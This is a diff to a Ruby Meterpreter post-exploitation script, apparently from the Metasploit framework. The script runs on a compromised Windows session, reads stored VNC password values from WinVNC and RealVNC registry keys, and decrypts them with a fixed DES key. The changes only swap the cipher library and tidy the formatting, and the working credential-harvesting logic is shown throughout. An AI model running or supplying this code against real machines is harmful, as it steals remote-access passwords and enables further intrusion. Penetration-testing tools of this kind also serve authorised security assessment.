@@ -11,7 +11,7 @@
 # 1.0 - 9/24/9 - Initial release
 #----------------------------------------------------------------
 
-require 'cipher/des'
+require 'rex/proto/rfb/cipher'
 
 session = client
 
@@ -59,20 +59,20 @@ keys = [
 	'HKLM\\Software\\ORL\\WinVNC\\Default', 'HKCU\\Software\\ORL\\WinVNC\\Default',
 	'HKLM\\Software\\RealVNC\\WinVNC4', 'HKCU\\Software\\RealVNC\\WinVNC4',
 	'HKLM\\Software\\RealVNC\\Default', 'HKCU\\Software\\RealVNC\\Default',
-       ]
+]
 
 # parse the command line
 listkeylocs = false
 keytosearch = nil
 
 @@exec_opts.parse(args) { |opt, idx, val|
-    case opt
-	    when "-h"
-			usage
-		when "-l"
-			listkeylocations(keys)
-		when "-k"
-			keytosearch = val
+	case opt
+	when "-h"
+		usage
+	when "-l"
+		listkeylocations(keys)
+	when "-k"
+		keytosearch = val
 	end
 }
 if client.platform =~ /win32|win64/
@@ -82,7 +82,7 @@ if keytosearch == nil
 		vncpw = get_vncpw(session, key)
 		if vncpw
 			vncpw_hextext = vncpw.data.unpack("H*").to_s
-			vncpw_text = Cipher::DES.decrypt fixedkey, vncpw.data
+			vncpw_text = Rex::Proto::RFB::Cipher.decrypt vncpw.data, fixedkey
 			print_status("FOUND in #{key} -=> #{vncpw_hextext} => #{vncpw_text}")
 		end
 	}
@@ -91,7 +91,7 @@ else
 	vncpw = get_vncpw(session, keytosearch)
 	if vncpw
 		vncpw_hextext = vncpw.data.unpack("H*").to_s
-		vncpw_text = Cipher::DES.decrypt fixedkey, vncpw.data
+		vncpw_text = Rex::Proto::RFB::Cipher.decrypt vncpw.data, fixedkey
 		print_status("FOUND in #{keytosearch} -=> #{vncpw_hextext} => #{vncpw_text}")
 	else
 		print_status("Not found")
